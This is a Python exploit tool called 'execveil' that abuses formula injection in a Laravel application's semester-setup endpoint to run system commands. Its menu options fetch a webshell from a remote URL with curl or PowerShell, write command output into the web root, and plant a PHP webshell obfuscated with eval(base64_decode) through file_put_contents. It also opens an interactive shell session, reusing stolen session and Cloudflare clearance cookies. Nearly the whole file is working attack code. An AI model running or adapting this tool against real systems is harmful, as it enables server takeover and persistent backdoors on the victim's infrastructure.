import requests
import json
import sys
import re
import base64
import os
import random
import string

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

def _build_banner():
    art = [
        "  .-----------.  ",
        "  | $ formula |  ",
        "  |-----------|  ",
        "  | $x=$pre;  |  ",
        "  | system(   |  ",
        "  |   'cmd'   |  ",
        "  | );        |  ",
        "  |-----------|  ",
        "  |  [ RCE ]  |  ",
        "  '-----------'  ",
        "        |        ",
        "        |        ",
        "       \\|/       ",
        "    .-------.    ",
        "    | SHELL |    ",
        "    '-------'    ",
    ]

    inject = [
        "███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗███████╗██╗██╗     ",
        "██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║██╔════╝██║██║     ",
        "█████╗   ╚███╔╝ █████╗  ██║     ██║   ██║█████╗  ██║██║     ",
        "██╔══╝   ██╔██╗ ██╔══╝  ██║     ╚██╗ ██╔╝██╔══╝  ██║██║     ",
        "███████╗██╔╝ ██╗███████╗╚██████╗ ╚████╔╝ ███████╗██║███████╗",
        "╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═══╝  ╚══════╝╚═╝╚══════╝",
    ]

    T = max(len(l) for l in inject)
    colored_title = (
        [" " * T] * 5
        + [f"{RED}{l}{RESET}{' ' * (T - len(l))}" for l in inject]
        + [" " * T] * 5
    )

    lines = [""]
    for t, a in zip(colored_title, art):
        lines.append(f"  {t}    {YELLOW}{a}{RESET}")
    lines.append(f"\n  {DIM}formula injection → RCE  //  execveil{RESET}\n")
    return "\n".join(lines)

print(_build_banner())

# ── POC definitions ───────────────────────────────────────────────────────────

_SHELL_URL = (
    ""
)

POCS = [
    {
        "id":    1,
        "name":  "curl webshell download  (Windows curl)",
        "color": CYAN,
        "desc":  "Downloads a remote shell via curl to the web root",
        "extra": [("Webshell source URL",  _SHELL_URL),
                  ("Shell output path",    "c:/laragon/www/es_ldcu/public/shell.php"),
                  ("Shell URL after deploy", "/shell.php?cmd=whoami")],
        "cmd":   lambda extra: f'curl {extra[0]} -o {extra[1]}',
    },
    {
        "id":    2,
        "name":  "PowerShell webshell download",
        "color": MAGENTA,
        "desc":  "Downloads shell via Invoke-WebRequest (PowerShell)",
        "extra": [("Webshell source URL",  _SHELL_URL),
                  ("Shell output path",    "c:/laragon/www/es_ldcu/public/s.php"),
                  ("Shell URL after deploy", "/s.php?cmd=whoami")],
        "cmd":   lambda extra: (
            f'powershell -Command Invoke-WebRequest '
            f'-Uri {extra[0]} -OutFile {extra[1]}'
        ),
    },
    {
        "id":    3,
        "name":  "Direct command execution",
        "color": YELLOW,
        "desc":  "Runs arbitrary command; redirects output to a web-accessible file",
        "extra": [("Command to execute", "whoami"),
                  ("Output file path",   "c:/laragon/www/es_ldcu/public/output.txt"),
                  ("Output URL",         "/output.txt")],
        "cmd":   lambda extra: f'{extra[0]} > {extra[1]}',
    },
    {
        "id":    4,
        "name":  "Interactive shell session",
        "color": GREEN,
        "desc":  "Stream live command output from an already-deployed webshell",
        "extra": [("Shell URL path", "/ev.php")],
        "cmd":   None,
    },
    {
        "id":    5,
        "name":  "Deploy EXECVEIL shell  (file_put_contents)",
        "color": GREEN,
        "desc":  "Injects ev_shell.php directly via PHP file_put_contents — no curl/PS needed",
        "extra": [("Shell filename", "ev.php")],
        "hint":  "Path resolved via $_SERVER['DOCUMENT_ROOT'] — works on any server",
        "cmd":   None,
    },
]

# ── helpers ───────────────────────────────────────────────────────────────────

def _obfuscate(src):
    """Multi-layer PHP obfuscation: strip → rename vars → eval(base64_decode) wrapper."""
    import random, string

    # 1. strip comments and collapse whitespace
    src = re.sub(r'//[^\n]*', '', src)           # single-line comments
    src = re.sub(r'/\*.*?\*/', '', src, flags=re.S)  # block comments
    src = re.sub(r'#[^\n]*', '', src)            # hash comments
    src = re.sub(r'\s+', ' ', src).strip()

    # 2. rename all PHP variables to random hex names (skip superglobals)
    SUPERGLOBALS = {
        '_GET', '_POST', '_SERVER', '_COOKIE', '_SESSION',
        '_REQUEST', '_FILES', '_ENV', '_GLOBALS',
    }
    vars_found = sorted(set(re.findall(r'\$([a-zA-Z_][a-zA-Z0-9_]*)', src)),
                        key=len, reverse=True)
    mapping = {}
    for v in vars_found:
        if v in SUPERGLOBALS:
            continue
        rnd = '_' + ''.join(random.choices(string.hexdigits[:16], k=8))
        mapping[v] = rnd
    for original, obf in mapping.items():
        src = re.sub(r'\$' + re.escape(original) + r'(?=[^a-zA-Z0-9_]|$)',
                     '$' + obf, src)

    # 3. wrap in eval(base64_decode(...)) so the file on disk is opaque
    # eval() runs raw PHP — strip the <?php tag before encoding
    inner = re.sub(r'<\?php\s*', '', src, count=1, flags=re.IGNORECASE).strip()
    inner_b64 = base64.b64encode(inner.encode()).decode()
    wrapped   = f"<?php eval(base64_decode('{inner_b64}'));"
    return wrapped


def _strip_html(text):
    text = re.sub(r'<[^>]+>', '', text)
    text = text.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&').replace('&#039;', "'").replace('&quot;', '"')
    return text.strip()

def shell_session(base_url, shell_path, session_cookie, token=None):
    host      = base_url.replace('https://', '').replace('http://', '')
    shell_url = f"{base_url}{shell_path}"
    headers   = {"Cookie": _cookie_header(session_cookie)}

    print(f"\n  {GREEN}[✓]{RESET} Shell ready → {CYAN}{shell_url}{RESET}")
    mode = f"{DIM}JSON API{RESET}" if token else f"{DIM}HTML (no token){RESET}"
    print(f"  {DIM}Mode: {RESET}{mode}  {DIM}· Type 'exit' to return to menu.{RESET}\n")

    while True:
        try:
            cmd = input(f"  {RED}┌─[shell@{host}]{RESET}\n  {RED}└──╼{RESET} {YELLOW}${RESET} ").strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n\n  {YELLOW}[!]{RESET} Shell session ended.")
            break

        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "q"):
            print(f"  {YELLOW}[!]{RESET} Shell session ended.")
            break

        params = {"cmd": cmd}
        if token:
            params["t"] = token

        try:
            print()
            with requests.get(shell_url, params=params,
                              headers=headers, stream=True, timeout=30) as r:
                buf = ""
                for chunk in r.iter_content(chunk_size=512, decode_unicode=True):
                    if chunk:
                        buf += chunk

                # try JSON (execveil shell), fall back to HTML strip
                output = None
                exit_code = 0
                try:
                    data = json.loads(buf)
                    output    = data.get("out", "")
                    exit_code = data.get("code", 0)
                except Exception:
                    output = _strip_html(buf)

                code_color = GREEN if exit_code == 0 else RED
                if output:
                    for line in output.splitlines():
                        print(f"  {DIM}│{RESET}  {line}")
                else:
                    print(f"  {DIM}│{RESET}  {DIM}(no output){RESET}")
                if token:
                    print(f"  {DIM}└─ exit code {code_color}{exit_code}{RESET}")
            print()
        except Exception as e:
            print(f"  {RED}[!]{RESET} {e}\n")


def print_menu():
    print(f"  {DIM}┌{'─' * 48}┐{RESET}")
    print(f"  {DIM}│{RESET}  {BOLD}Select POC{RESET}{' ' * 38}{DIM}│{RESET}")
    print(f"  {DIM}├{'─' * 48}┤{RESET}")
    for p in POCS:
        print(f"  {DIM}│{RESET}  {p['color']}{p['id']}{RESET}  {p['name']}{' ' * (44 - len(p['name']))}{DIM}│{RESET}")
    print(f"  {DIM}│{RESET}  {DIM}0  exit{' ' * 42}{DIM}│{RESET}")
    print(f"  {DIM}└{'─' * 48}┘{RESET}")

def _cookie_header(session_cookie):
    base = f"laravel_session={session_cookie}"
    if CF_CLEARANCE:
        base += f"; cf_clearance={CF_CLEARANCE}"
    return base

def send(base_url, session_cookie, command, method):
    payload = {
        "formula":       f"$x=$prelim;system(\"{command}\")",
        "prelim":        "30",
        "midterm":       "30",
        "prefi":         "20",
        "final":         "20",
        "isPointScaled": "0",
        "passingRate":   "75",
    }
    endpoint = f"{base_url}/semester-setup/add"
    method   = method.upper()
    print(f"\n  {DIM}[>]{RESET} {CYAN}{method}{RESET} {endpoint}")
    print(f"  {DIM}[>]{RESET} formula: {DIM}{payload['formula'][:80]}{RESET}\n")
    headers = {"Cookie": _cookie_header(session_cookie)}
    try:
        if method == "GET":
            r = requests.get(endpoint, params=payload, headers=headers, timeout=8)
        elif method in ("POST", "PUT", "PATCH"):
            headers["Content-Type"] = "application/json"
            r = requests.request(method, endpoint, headers=headers,
                                 data=json.dumps(payload), timeout=8)
        else:
            print(f"  {RED}[!]{RESET} Unknown method: {method}")
            return None
        return r
    except Exception as e:
        print(f"  {RED}[!]{RESET} Request failed: {e}")
        return None

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    BASE_URL       = input(f"  {CYAN}[?]{RESET} Target URL          : ").strip().rstrip("/")
    SESSION_COOKIE = input(f"  {CYAN}[?]{RESET} laravel_session     : ").strip()
    METHOD         = input(f"  {CYAN}[?]{RESET} HTTP method  [GET]  : ").strip() or "GET"
    SHELL_TOKEN    = input(f"  {CYAN}[?]{RESET} Shell token [evshell]: ").strip() or "evshell"
    CF_CLEARANCE   = input(f"  {CYAN}[?]{RESET} cf_clearance  [skip] : ").strip()
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

# ── main loop ─────────────────────────────────────────────────────────────────

while True:
    print()
    print_menu()
    try:
        choice = input(f"\n  {DIM}┌─[execveil]─[~]{RESET}\n  {DIM}└──╼{RESET} {CYAN}${RESET} ").strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n\n  {YELLOW}[!]{RESET} Exiting.")
        break

    if choice == "0" or choice.lower() in ("exit", "quit", "q"):
        print(f"\n  {YELLOW}[!]{RESET} Exiting.\n")
        break

    if not choice.isdigit() or not (1 <= int(choice) <= len(POCS)):
        print(f"  {RED}[!]{RESET} Invalid choice.")
        continue

    poc = POCS[int(choice) - 1]
    print(f"\n  {poc['color']}[{poc['id']}]{RESET} {BOLD}{poc['name']}{RESET}")
    print(f"  {DIM}    {poc['desc']}{RESET}\n")

    # collect extra inputs
    extra_vals = []
    try:
        for label, default in poc["extra"]:
            val = input(f"  {CYAN}[?]{RESET} {label} [{DIM}{default}{RESET}]: ").strip() or default
            extra_vals.append(val)
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!]{RESET} Cancelled.")
        continue

    # POC 4: standalone shell session
    if poc["id"] == 4:
        shell_path = extra_vals[0] if extra_vals else "/ev.php"
        shell_session(BASE_URL, shell_path, SESSION_COOKIE, token=SHELL_TOKEN)
        continue

    # POC 5: deploy custom execveil shell via file_put_contents
    if poc["id"] == 5:
        shell_filename = extra_vals[0].lstrip("/") if extra_vals else "ev.php"
        shell_url_path = "/" + shell_filename

        # obfuscation toggle
        try:
            do_obf = input(f"  {CYAN}[?]{RESET} Obfuscate shell? [y/N]: ").strip().lower() == "y"
        except KeyboardInterrupt:
            continue

        # load template, substitute token
        tpl_path = os.path.join(os.path.dirname(__file__), "ev_shell.php")
        try:
            with open(tpl_path, "r") as f:
                src = f.read()
        except FileNotFoundError:
            print(f"  {RED}[!]{RESET} ev_shell.php not found next to execveil.py")
            continue

        src = src.replace("EV_TOKEN", SHELL_TOKEN)
        if do_obf:
            src = _obfuscate(src)
            print(f"  {DIM}[>]{RESET} obfuscated {DIM}({len(src)} bytes){RESET}")
        else:
            print(f"  {DIM}[>]{RESET} plain {DIM}({len(src)} bytes){RESET}")

        # preview first 80 chars of the PHP so you can spot token issues
        preview_src = src[:80].replace("\n", " ").strip()
        print(f"  {DIM}[>]{RESET} php preview: {DIM}{preview_src}{RESET}")

        b64     = base64.b64encode(src.encode()).decode()
        # just the filename — PHP CWD in a web request is the webroot (public/)
        formula = f"$x=$prelim;file_put_contents('{shell_filename}',base64_decode('{b64}'));"
        payload = {"formula": formula, "prelim": "30", "midterm": "30",
                   "prefi": "20", "final": "20", "isPointScaled": "0", "passingRate": "75"}
        endpoint    = f"{BASE_URL}/semester-setup/add"
        headers_req = {"Cookie": _cookie_header(SESSION_COOKIE)}

        print(f"\n  {DIM}[>]{RESET} {CYAN}{METHOD.upper()}{RESET} {endpoint}")
        print(f"  {DIM}[>]{RESET} writing to {CYAN}(webroot)/{shell_filename}{RESET}")
        print(f"  {DIM}[>]{RESET} token = {YELLOW}{SHELL_TOKEN}{RESET}\n")

        def _do_request(pl):
            if METHOD.upper() == "GET":
                return requests.get(endpoint, params=pl, headers=headers_req, timeout=8)
            h = {**headers_req, "Content-Type": "application/json"}
            return requests.request(METHOD.upper(), endpoint, headers=h,
                                    data=json.dumps(pl), timeout=8)

        try:
            r  = _do_request(payload)
            sc = GREEN if r.status_code < 300 else YELLOW if r.status_code < 500 else RED
            print(f"  {DIM}[<]{RESET} deploy status {sc}{r.status_code}{RESET}")
            print(f"  {DIM}[<]{RESET} response: {DIM}{r.text[:300].replace(chr(10),' ')}{RESET}")

            if r.status_code < 400:
                # ping the shell directly — cleanest verify possible
                shell_full_url = f"{BASE_URL}{shell_url_path}"
                print(f"  {DIM}[>]{RESET} pinging {CYAN}{shell_full_url}?t={SHELL_TOKEN}&cmd=echo+evshell_ok{RESET}")
                try:
                    ping = requests.get(
                        shell_full_url,
                        params={"t": SHELL_TOKEN, "cmd": "echo evshell_ok"},
                        headers={"Cookie": _cookie_header(SESSION_COOKIE)},
                        timeout=6
                    )
                    if "evshell_ok" in ping.text:
                        print(f"  {GREEN}[✓]{RESET} Shell is {GREEN}{BOLD}LIVE{RESET}")
                        drop = "y"
                    elif ping.status_code == 404:
                        raw = ping.text[:120].replace("\n"," ").strip()
                        # distinguish our custom 404 vs Laravel 404
                        if "Not Found" in raw and "<!DOCTYPE" not in raw[:20]:
                            print(f"  {RED}[✗]{RESET} Shell returned our custom 404 — {YELLOW}token mismatch{RESET}")
                            print(f"  {DIM}    check: token in shell = '{SHELL_TOKEN}'?{RESET}")
                        else:
                            print(f"  {RED}[✗]{RESET} Got 404 — file may not have been written to {YELLOW}{out_path}{RESET}")
                        drop = input(f"  {CYAN}[?]{RESET} Try shell session anyway? [y/N]: ").strip().lower()
                    else:
                        print(f"  {YELLOW}[?]{RESET} Unexpected response ({ping.status_code}): {DIM}{ping.text[:120]}{RESET}")
                        drop = input(f"  {CYAN}[?]{RESET} Drop into shell session anyway? [y/N]: ").strip().lower()
                except Exception as pe:
                    print(f"  {RED}[!]{RESET} Ping failed: {pe}")
                    drop = input(f"  {CYAN}[?]{RESET} Drop into shell session anyway? [y/N]: ").strip().lower()

                if drop == "y":
                    shell_session(BASE_URL, shell_url_path, SESSION_COOKIE, token=SHELL_TOKEN)
        except Exception as e:
            print(f"  {RED}[!]{RESET} {e}")
        print()
        continue

    cmd = poc["cmd"](extra_vals)
    r   = send(BASE_URL, SESSION_COOKIE, cmd, METHOD)

    if r is not None:
        status_color = GREEN if r.status_code < 300 else YELLOW if r.status_code < 500 else RED
        print(f"  {DIM}[<]{RESET} status {status_color}{r.status_code}{RESET}")
        try:
            body = r.json()
            print(f"  {DIM}[<]{RESET} {json.dumps(body)[:120]}")
        except Exception:
            print(f"  {DIM}[<]{RESET} {r.text[:120]}")

    # show access URL + offer shell mode after successful deploy
    if extra_vals and extra_vals[-1].startswith("/"):
        print(f"\n  {GREEN}[✓]{RESET} Access: {CYAN}{BASE_URL}{extra_vals[-1]}{RESET}")
        if r is not None and r.status_code < 300 and poc["id"] in (1, 2):
            try:
                drop = input(f"  {CYAN}[?]{RESET} Drop into shell session? [Y/n]: ").strip().lower()
            except KeyboardInterrupt:
                drop = "n"
            if drop != "n":
                shell_session(BASE_URL, extra_vals[-1].split("?")[0], SESSION_COOKIE, token=None)

    print()
